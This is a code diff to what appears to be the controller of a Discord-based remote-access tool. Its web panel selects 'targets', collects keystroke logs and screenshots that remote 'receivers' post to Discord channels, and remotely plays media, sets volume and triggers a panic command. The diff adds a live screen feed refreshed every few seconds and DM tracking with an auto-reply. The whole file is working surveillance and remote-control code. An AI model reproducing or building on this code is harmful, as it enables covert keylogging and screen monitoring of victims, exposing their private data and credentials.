@@ -40,7 +40,7 @@ CONTROLLER_TOKEN = os.getenv("CONTROLLER_TOKEN", "")
 COMMAND_CHANNEL_ID = int(os.getenv("COMMAND_CHANNEL_ID", "1360236257212633260"))
 TARGET_CHANNEL_ID = int(os.getenv("TARGET_CHANNEL_ID", "0"))
 LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID", "1457385049845403648"))
-BOT_TAG = ""  # unused for now; kept for compatibility if needed
+BOT_TAG = ""
 
 assert CONTROLLER_TOKEN
 assert COMMAND_CHANNEL_ID
@@ -48,14 +48,16 @@ assert TARGET_CHANNEL_ID
 
 ROOT_DIR = Path(__file__).parent
 _latest_screenshot: dict[str, str] = {"url": "", "message_id": "", "ts": ""}
-_screenshot_log: list[dict[str, str]] = []
-_MAX_SCREENSHOTS = 50
 _latest_keylog: dict[str, str] = {"text": "", "message_id": "", "ts": ""}
+_dm_messages: list[str] = []
+_latest_dm_user: dict[str, str] = {"id": "", "name": ""}
 STATE_FILE = ROOT_DIR / "receivers.json"
 _receivers: dict[str, dict] = {}  # id -> {"alias": str, "last_seen": float, "tag": str, "mode": str}
 _selected_receiver: Optional[str] = None
 STALE_SECONDS = 90
 PRUNE_SECONDS = 60 * 60 * 24 * 30
+MAX_DM_MESSAGES = 200
+DM_REPLY_TEXT = "Meesage Reciever. We Will be with you shortly\n\nThank you for choosing our services <3"
 
 def _load_state():
     global _receivers, _selected_receiver
@@ -99,6 +101,8 @@ def _receiver_status(info: dict, now: Optional[float] = None) -> tuple[str, str,
     mode = (info.get("mode") or "").lower()
     if mode in ("gif", "gif_display"):
         return ("Gif Display", "gif", True)
+    if mode in ("live", "live_display"):
+        return ("Live Display", "live", True)
     return ("Online", "online", True)
 
 def _set_receiver_mode(rid: Optional[str], mode: str):
@@ -133,22 +137,33 @@ async def on_ready():
 
 @bot.event
 async def on_message(message: discord.Message):
+    # Track DMs (non-commands)
+    if message.guild is None and not message.author.bot:
+        content = (message.content or "").strip()
+        prefix = bot.command_prefix
+        prefixes: tuple[str, ...] = ()
+        if isinstance(prefix, str):
+            prefixes = (prefix,)
+        elif isinstance(prefix, (list, tuple, set)):
+            prefixes = tuple(str(p) for p in prefix)
+        is_command = content and prefixes and any(content.startswith(p) for p in prefixes if p)
+        if content and not is_command:
+            timestamp = message.created_at.strftime("%Y-%m-%d %H:%M:%S")
+            username = message.author.name or str(message.author)
+            line = f"{timestamp} - {username}: {content}"
+            _dm_messages.append(line)
+            if len(_dm_messages) > MAX_DM_MESSAGES:
+                _dm_messages.pop(0)
+            _latest_dm_user["id"] = str(message.author.id)
+            _latest_dm_user["name"] = username
     # Track latest screenshot posted by receiver
     if message.channel.id == TARGET_CHANNEL_ID and message.attachments:
         for att in message.attachments:
             name = (att.filename or "").lower()
             if name.endswith((".png", ".jpg", ".jpeg")):
-                msg_id = str(message.id)
                 _latest_screenshot["url"] = att.url
-                _latest_screenshot["message_id"] = msg_id
+                _latest_screenshot["message_id"] = str(message.id)
                 _latest_screenshot["ts"] = str(message.created_at)
-                if not _screenshot_log or _screenshot_log[0].get("message_id") != msg_id:
-                    _screenshot_log.insert(
-                        0,
-                        {"url": att.url, "message_id": msg_id, "ts": str(message.created_at)},
-                    )
-                    if len(_screenshot_log) > _MAX_SCREENSHOTS:
-                        del _screenshot_log[_MAX_SCREENSHOTS:]
                 break
     # Track latest key logs posted by receiver
     if message.channel.id == LOG_CHANNEL_ID and message.content:
@@ -257,6 +272,7 @@ CONTROL_HTML = """<!doctype html>
     .status-online { border-color: rgba(34,197,94,0.5); color: #86efac; background: rgba(34,197,94,0.12); }
     .status-offline { border-color: rgba(239,68,68,0.45); color: #fecaca; background: rgba(239,68,68,0.12); }
     .status-gif { border-color: rgba(251,146,60,0.45); color: #fdba74; background: rgba(251,146,60,0.12); }
+    .status-live { border-color: rgba(56,189,248,0.45); color: #bae6fd; background: rgba(56,189,248,0.12); }
     .receiver-actions { display: flex; gap: 8px; flex-wrap: wrap; justify-content: flex-end; }
     .receiver-actions form { margin: 0; }
     .receiver-id { opacity: 0.8; }
@@ -264,17 +280,9 @@ CONTROL_HTML = """<!doctype html>
     .receiver-empty { padding: 12px; border: 1px dashed var(--border); border-radius: 12px; color: var(--muted); }
     .rename-section { margin-top: 16px; padding: 12px; border: 1px solid var(--border); border-radius: 12px; background: #0c0817; }
     .rename-section h2 { margin: 0 0 10px; font-size: 14px; letter-spacing: 0.3px; }
-    .rename-grid { display: grid; grid-template-columns: minmax(200px, 1fr) auto; gap: 10px; align-items: center; }
+    .rename-grid { display: grid; grid-template-columns: minmax(160px, 1fr) minmax(200px, 2fr) auto; gap: 10px; align-items: center; }
     .rename-select { width: 100%; padding: 10px; border-radius: 10px; border: 1px solid var(--border); background: #0c0817; color: var(--text); }
-    .gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(120px, 1fr)); gap: 10px; }
-    .shot-thumb { border-radius: 10px; border: 1px solid var(--border); background: #0c0817; overflow: hidden; cursor: pointer; }
-    .shot-thumb img { display: block; width: 100%; height: 90px; object-fit: cover; }
-    .shot-empty { padding: 12px; border: 1px dashed var(--border); border-radius: 12px; color: var(--muted); }
-    .modal { position: fixed; inset: 0; background: rgba(7,3,15,0.85); display: none; align-items: center; justify-content: center; z-index: 1300; }
-    .modal.open { display: flex; }
-    .modal-card { width: min(960px, 92vw); max-height: 90vh; background: linear-gradient(145deg, rgba(14,10,26,0.96), rgba(18,14,30,0.99)); border: 1px solid var(--border); border-radius: 14px; padding: 12px; box-shadow: 0 12px 36px rgba(0,0,0,0.4); }
-    .modal-card img { width: 100%; height: auto; max-height: 80vh; object-fit: contain; border-radius: 10px; border: 1px solid var(--border); }
-    .modal-close { margin-top: 10px; display: flex; justify-content: flex-end; }
+    .rename-input { width: 180px; min-width: 140px; margin-bottom: 0; }
     .panic-btn { position: fixed; right: 24px; bottom: 24px; z-index: 999; background: linear-gradient(135deg, #f97316, var(--danger)); color: #0b0419; box-shadow: 0 12px 24px rgba(239,68,68,0.35); }
     .panic-btn:active { transform: translateY(1px); }
     .locked .app { pointer-events: none; filter: blur(1px); }
@@ -287,16 +295,16 @@ CONTROL_HTML = """<!doctype html>
   <div class="layout">
     <div class="card">
       <div class="tabs">
-        <button class="tab-btn active" data-tab="surprise">Screen Functions</button>
+        <button class="tab-btn active" data-tab="surprise">Surprise</button>
         <button class="tab-btn" data-tab="select">Select Target</button>
         <button class="tab-btn" data-tab="openclose">Open & Close :3</button>
         <button class="tab-btn" data-tab="volume">Volume ;0</button>
-        <button class="tab-btn" data-tab="shots">Screenshots</button>
         <button class="tab-btn" data-tab="logs">Logs</button>
+        <button class="tab-btn" data-tab="messages">Messages</button>
         <button class="tab-btn" data-tab="remotes">remote's</button>
       </div>
       <div class="tab-pane active" data-tab="surprise">
-        <h1>Screen Functions</h1>
+        <h1>Display Surprise</h1>
         <p style="margin: 4px 0 12px; color:var(--muted);">Sends local <code>M.gif</code> and <code>sound.mp3</code> to the receiver and triggers display.</p>
         <div class="row">
           <form method="post" action="/ui/surprise">
@@ -305,9 +313,6 @@ CONTROL_HTML = """<!doctype html>
           <form method="post" action="/ui/gif/stop">
             <button class="secondary" type="submit">Stop Display</button>
           </form>
-          <form method="post" action="/ui/screenshot/once">
-            <button class="secondary" type="submit">Screenshot</button>
-          </form>
         </div>
       </div>
       <div class="tab-pane" data-tab="select">
@@ -315,14 +320,13 @@ CONTROL_HTML = """<!doctype html>
         <div id="receiver-summary" class="receiver-summary"></div>
         <div id="receiver-list" class="receiver-list"></div>
         <div class="rename-section">
-          <h2>Rename</h2>
-          <p style="margin: 4px 0 12px; color:var(--muted);">Select a receiver to rename it.</p>
+          <h2>Rename Display</h2>
           <form id="rename-form" method="post" action="/ui/rename/">
             <div class="rename-grid">
               <select id="rename-target" name="rid" class="rename-select"></select>
-              <button id="rename-trigger" class="secondary" type="button">Rename</button>
+              <input id="rename-alias" class="rename-input" name="alias" type="text" placeholder="New display name">
+              <button class="secondary" type="submit">Save Name</button>
             </div>
-            <input id="rename-alias" name="alias" type="hidden">
           </form>
         </div>
       </div>
@@ -346,13 +350,6 @@ CONTROL_HTML = """<!doctype html>
           <input id="level" name="level" type="number" min="0" max="100" step="1" value="50" required>
           <button type="submit">Set Volume</button>
         </form>
-      </div>
-      <div class="tab-pane" data-tab="shots">
-        <h1>Screenshots</h1>
-        <p style="color:var(--muted); margin-bottom:12px;">
-          Recent screenshots appear here. Click any thumbnail to view it larger.
-        </p>
-        <div id="shots-grid" class="gallery-grid"></div>
       </div>
       <div class="tab-pane" data-tab="logs">
         <h1>Key Logs</h1>
@@ -382,6 +379,27 @@ CONTROL_HTML = """<!doctype html>
           font-size:13px;
         ">Waiting for logs…</pre>
       </div>
+      <div class="tab-pane" data-tab="messages">
+        <h1>Messages</h1>
+        <p style="color:var(--muted); margin-bottom:12px;">
+          DMs received by the bot (non-commands).
+        </p>
+        <div class="row">
+          <form method="post" action="/ui/messages/reply">
+            <button type="submit">Reply Latest DM</button>
+          </form>
+        </div>
+        <pre id="message-output" style="
+          margin-top:12px;
+          padding:12px;
+          background:#0c0817;
+          border:1px solid var(--border);
+          border-radius:10px;
+          max-height:260px;
+          overflow:auto;
+          font-size:13px;
+        ">Waiting for messages...</pre>
+      </div>
       <div class="tab-pane" data-tab="remotes">
         <h1>Remote's</h1>
         <p style="color:var(--muted); margin-bottom:12px;">
@@ -392,16 +410,23 @@ CONTROL_HTML = """<!doctype html>
         </form>
       </div>
     </div>
-  </div>
-  <button id="panic-btn" class="panic-btn" type="button">Panic Mode</button>
-  </div>
-  <div id="shot-modal" class="modal">
-    <div class="modal-card">
-      <img id="shot-modal-img" alt="Screenshot preview">
-      <div class="modal-close">
-        <button id="shot-modal-close" class="secondary" type="button">Close</button>
+    <div class="card">
+      <h1>Live Screen (5s)</h1>
+      <p style="margin: 4px 0 12px; color:var(--muted);">Latest screenshot posted by receiver every 5 seconds.</p>
+      <div id="screen-wrap">
+        <img id="screen-img" src="" alt="Waiting for screenshot..." />
+      </div>
+      <div class="row" style="margin-top:10px;">
+        <form method="post" action="/ui/live/start">
+          <button type="submit">Start Live</button>
+        </form>
+        <form method="post" action="/ui/live/stop">
+          <button class="secondary" type="submit">Stop Live</button>
+        </form>
       </div>
     </div>
+  </div>
+  <button id="panic-btn" class="panic-btn" type="button">Panic Mode</button>
   </div>
   <div id="pin-overlay" class="pin-overlay">
     <div class="pin-card">
@@ -448,22 +473,24 @@ CONTROL_HTML = """<!doctype html>
     const renameForm = document.getElementById('rename-form');
     const renameSelect = document.getElementById('rename-target');
     const renameInput = document.getElementById('rename-alias');
-    const renameTrigger = document.getElementById('rename-trigger');
-    const shotsGrid = document.getElementById('shots-grid');
-    const shotModal = document.getElementById('shot-modal');
-    const shotModalImg = document.getElementById('shot-modal-img');
-    const shotModalClose = document.getElementById('shot-modal-close');
 
     function updateRenameSection(rec) {
-      if (!renameForm || !renameSelect || !renameInput || !renameTrigger) return;
+      if (!renameForm || !renameSelect || !renameInput) return;
       if (!rec) {
         renameForm.action = '/ui/rename/';
-        renameInput.value = '';
-        renameTrigger.disabled = true;
+        renameInput.placeholder = 'No receiver selected';
+        if (document.activeElement !== renameInput) {
+          renameInput.value = '';
+        }
+        renameForm.querySelector('button').disabled = true;
         return;
       }
       renameForm.action = '/ui/rename/' + encodeURIComponent(rec.id);
-      renameTrigger.disabled = false;
+      renameForm.querySelector('button').disabled = false;
+      if (document.activeElement !== renameInput) {
+        renameInput.value = rec.alias || '';
+        renameInput.placeholder = rec.name || rec.tag || rec.id;
+      }
     }
 
     if (renameSelect) {
@@ -471,34 +498,6 @@ CONTROL_HTML = """<!doctype html>
         const rid = renameSelect.value;
         const rec = lastReceiverList.find(item => item.id === rid);
         updateRenameSection(rec);
-        if (rec) {
-          promptRename(rec);
-        }
-      });
-    }
-
-    async function promptRename(rec) {
-      if (!renameForm || !renameInput || !rec) return;
-      const current = rec.name || rec.tag || rec.id;
-      const next = window.prompt(`Rename "${current}" to:`, rec.alias || rec.name || '');
-      if (next === null) return;
-      const cleaned = next.trim();
-      renameInput.value = cleaned;
-      const ok = await submitFormNoReload(renameForm);
-      if (ok) {
-        refreshReceivers();
-      }
-    }
-
-    if (renameTrigger) {
-      renameTrigger.addEventListener('click', () => {
-        const rid = renameSelect ? renameSelect.value : '';
-        const rec = lastReceiverList.find(item => item.id === rid);
-        if (!rec) {
-          alert('Select a receiver first.');
-          return;
-        }
-        promptRename(rec);
       });
     }
     async function refreshReceivers() {
@@ -565,8 +564,7 @@ CONTROL_HTML = """<!doctype html>
           wireForm(selectForm);
           const btn = document.createElement('button');
           btn.type = 'submit';
-          const displayName = rec.name || rec.tag || rec.id;
-          btn.textContent = data.selected === rec.id ? `Selected: ${displayName}` : displayName;
+          btn.textContent = data.selected === rec.id ? 'Selected' : 'Select';
           if (!rec.online) {
             btn.className = 'secondary';
           }
@@ -612,6 +610,17 @@ CONTROL_HTML = """<!doctype html>
         }
       } catch (e) { /* ignore */ }
     }
+    async function refreshScreen() {
+      try {
+        const res = await fetch('/api/screenshot');
+        if (!res.ok) return;
+        const data = await res.json();
+        if (data.url) {
+          const img = document.getElementById('screen-img');
+          img.src = data.url + '?t=' + Date.now();
+        }
+      } catch (e) { /* ignore */ }
+    }
     async function refreshLogs() {
       try {
         const output = document.getElementById('log-output');
@@ -624,35 +633,14 @@ CONTROL_HTML = """<!doctype html>
         }
       } catch (e) { /* ignore */ }
     }
-    async function refreshScreenshots() {
-      if (!shotsGrid) return;
+    async function refreshMessages() {
       try {
-        const res = await fetch('/api/screenshots');
+        const output = document.getElementById('message-output');
+        if (!output) return;
+        const res = await fetch('/api/messages');
         if (!res.ok) return;
         const data = await res.json();
-        const items = data.items || [];
-        shotsGrid.innerHTML = '';
-        if (!items.length) {
-          const empty = document.createElement('div');
-          empty.className = 'shot-empty';
-          empty.textContent = 'No screenshots yet.';
-          shotsGrid.appendChild(empty);
-          return;
-        }
-        items.forEach(item => {
-          const wrap = document.createElement('div');
-          wrap.className = 'shot-thumb';
-          const img = document.createElement('img');
-          img.alt = 'Screenshot';
-          img.src = item.url;
-          wrap.appendChild(img);
-          wrap.addEventListener('click', () => {
-            if (!shotModal || !shotModalImg) return;
-            shotModalImg.src = item.url;
-            shotModal.classList.add('open');
-          });
-          shotsGrid.appendChild(wrap);
-        });
+        output.textContent = data.text || 'Waiting for messages...';
       } catch (e) { /* ignore */ }
     }
     async function submitFormNoReload(form) {
@@ -697,11 +685,13 @@ CONTROL_HTML = """<!doctype html>
 
     activateTab('surprise');
     refreshReceivers();
+    refreshScreen();
     refreshLogs();
-    refreshScreenshots();
+    refreshMessages();
     setInterval(refreshReceivers, 5000);
+    setInterval(refreshScreen, 4000);
     setInterval(refreshLogs, 5000);
-    setInterval(refreshScreenshots, 5000);
+    setInterval(refreshMessages, 5000);
 
     document.querySelectorAll('.app form').forEach(form => {
       if (form.id === 'pin-form') return;
@@ -730,12 +720,6 @@ CONTROL_HTML = """<!doctype html>
         }
       });
     }
-    if (shotModal && shotModalClose) {
-      shotModalClose.addEventListener('click', () => shotModal.classList.remove('open'));
-      shotModal.addEventListener('click', (e) => {
-        if (e.target === shotModal) shotModal.classList.remove('open');
-      });
-    }
   </script>
 </body>
 </html>"""
@@ -759,6 +743,7 @@ async def audio_ws(ws: WebSocket):
         pass
     finally:
         await hub.remove(ws)
+
 
 # ---------------- COMMAND ENDPOINTS ----------------
 async def _send_cmd(msg: str):
@@ -837,13 +822,15 @@ async def gif_stop():
 async def api_screenshot():
     return JSONResponse(_latest_screenshot)
 
-@app.get("/api/screenshots")
-async def api_screenshots():
-    return JSONResponse({"items": _screenshot_log})
-
 @app.get("/api/logs")
 async def api_logs():
     return JSONResponse(_latest_keylog)
+
+@app.get("/api/messages")
+async def api_messages():
+    text = "\n".join(_dm_messages)
+    latest = _latest_dm_user.get("name", "")
+    return JSONResponse({"text": text, "latest": latest})
 
 @app.get("/api/receivers")
 async def api_receivers():
@@ -899,11 +886,20 @@ async def ui_gif_stop():
     await gif_stop()
     return RedirectResponse(url="/", status_code=303)
 
-@app.post("/ui/screenshot/once")
-async def ui_screenshot_once():
+@app.post("/ui/live/start")
+async def ui_live_start():
     if not await _wait_controller_ready():
         return HTMLResponse("Discord bot not ready", status_code=503)
-    await _send_cmd(_cmd_with_selection("SCREENSHOT_ONCE"))
+    await _send_cmd(_cmd_with_selection("LIVE_START"))
+    _set_receiver_mode(_selected_receiver, "live")
+    return RedirectResponse(url="/", status_code=303)
+
+@app.post("/ui/live/stop")
+async def ui_live_stop():
+    if not await _wait_controller_ready():
+        return HTMLResponse("Discord bot not ready", status_code=503)
+    await _send_cmd(_cmd_with_selection("LIVE_STOP"))
+    _set_receiver_mode(_selected_receiver, "")
     return RedirectResponse(url="/", status_code=303)
 
 @app.post("/ui/logs/start")
@@ -1003,6 +999,20 @@ async def ui_panic():
     if not await _wait_controller_ready():
         return HTMLResponse("Discord bot not ready", status_code=503)
     await _send_cmd(_cmd_with_selection("PANIC"))
+    return RedirectResponse(url="/", status_code=303)
+
+@app.post("/ui/messages/reply")
+async def ui_messages_reply():
+    if not await _wait_controller_ready():
+        return HTMLResponse("Discord bot not ready", status_code=503)
+    user_id = _latest_dm_user.get("id")
+    if not user_id:
+        return HTMLResponse("No recent DM user", status_code=400)
+    try:
+        user = await bot.fetch_user(int(user_id))
+        await user.send(DM_REPLY_TEXT)
+    except Exception as e:
+        return HTMLResponse(f"Failed to DM user: {e}", status_code=500)
     return RedirectResponse(url="/", status_code=303)
 
 @app.post("/ui/select/{tag}")
